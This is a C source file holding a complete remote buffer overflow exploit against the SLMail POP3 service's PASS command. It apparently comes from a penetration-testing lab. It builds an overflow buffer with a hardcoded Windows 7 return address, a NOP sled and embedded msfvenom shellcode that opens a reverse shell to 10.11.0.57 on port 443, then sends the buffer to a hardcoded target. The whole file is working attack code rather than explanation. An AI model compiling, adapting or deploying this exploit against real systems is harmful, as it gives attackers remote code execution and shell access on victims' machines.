#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
#define retadd "\x8f\x35\x4a\x5f" /*win7  0x5f4a358f*/
#define port 110

/* msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.57 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -t c*/
/*shellcode is 351 bytes long*/

char shellcode[] =
"\xd9\xd0\xd9\x74\x24\xf4\x5e\x33\xc9\xba\x4c\xec\xb1\x34\xb1"
"\x52\x31\x56\x17\x83\xc6\x04\x03\x1a\xff\x53\xc1\x5e\x17\x11"
"\x2a\x9e\xe8\x76\xa2\x7b\xd9\xb6\xd0\x08\x4a\x07\x92\x5c\x67"
"\xec\xf6\x74\xfc\x80\xde\x7b\xb5\x2f\x39\xb2\x46\x03\x79\xd5"
"\xc4\x5e\xae\x35\xf4\x90\xa3\x34\x31\xcc\x4e\x64\xea\x9a\xfd"
"\x98\x9f\xd7\x3d\x13\xd3\xf6\x45\xc0\xa4\xf9\x64\x57\xbe\xa3"
"\xa6\x56\x13\xd8\xee\x40\x70\xe5\xb9\xfb\x42\x91\x3b\x2d\x9b"
"\x5a\x97\x10\x13\xa9\xe9\x55\x94\x52\x9c\xaf\xe6\xef\xa7\x74"
"\x94\x2b\x2d\x6e\x3e\xbf\x95\x4a\xbe\x6c\x43\x19\xcc\xd9\x07"
"\x45\xd1\xdc\xc4\xfe\xed\x55\xeb\xd0\x67\x2d\xc8\xf4\x2c\xf5"
"\x71\xad\x88\x58\x8d\xad\x72\x04\x2b\xa6\x9f\x51\x46\xe5\xf7"
"\x96\x6b\x15\x08\xb1\xfc\x66\x3a\x1e\x57\xe0\x76\xd7\x71\xf7"
"\x79\xc2\xc6\x67\x84\xed\x36\xae\x43\xb9\x66\xd8\x62\xc2\xec"
"\x18\x8a\x17\xa2\x48\x24\xc8\x03\x38\x84\xb8\xeb\x52\x0b\xe6"
"\x0c\x5d\xc1\x8f\xa7\xa4\x82\xa5\x3c\xa6\x6b\xd2\x40\xa6\x8a"
"\x99\xcc\x40\xe6\xcd\x98\xdb\x9f\x74\x81\x97\x3e\x78\x1f\xd2"
"\x01\xf2\xac\x23\xcf\xf3\xd9\x37\xb8\xf3\x97\x65\x6f\x0b\x02"
"\x01\xf3\x9e\xc9\xd1\x7a\x83\x45\x86\x2b\x75\x9c\x42\xc6\x2c"
"\x36\x70\x1b\xa8\x71\x30\xc0\x09\x7f\xb9\x85\x36\x5b\xa9\x53"
"\xb6\xe7\x9d\x0b\xe1\xb1\x4b\xea\x5b\x70\x25\xa4\x30\xda\xa1"
"\x31\x7b\xdd\xb7\x3d\x56\xab\x57\x8f\x0f\xea\x68\x20\xd8\xfa"
"\x11\x5c\x78\x04\xc8\xe4\x88\x4f\x50\x4c\x01\x16\x01\xcc\x4c"
"\xa9\xfc\x13\x69\x2a\xf4\xeb\x8e\x32\x7d\xe9\xcb\xf4\x6e\x83"
"\x44\x91\x90\x30\x64\xb0";
 
struct sockaddr_in plm,lar,target;

int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2978);
    memset(buffer, 0x00, 2978);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(16);
    memset(nop, 0x00, 16);
    memset(nop, 0x90, 16);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat, modified by SwedishJetson.\n");
    xs = conn("10.11.16.58");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);
}
